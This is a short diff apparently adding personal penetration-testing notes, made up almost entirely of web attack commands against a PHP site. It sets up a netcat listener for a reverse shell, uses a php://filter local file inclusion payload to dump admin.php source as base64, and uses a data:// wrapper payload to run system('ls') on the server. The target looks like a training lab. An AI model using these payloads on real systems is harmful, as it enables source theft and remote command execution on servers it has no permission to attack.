@@ -32,5 +32,12 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 
-
 nc -nvlp 4444
+-----------------------------------------------------------------------
+
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+echo "Some base64 outbut" | base64 -d # we nned to decode base64 output after the command above
+----------------------------------------------------------------------------
+
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
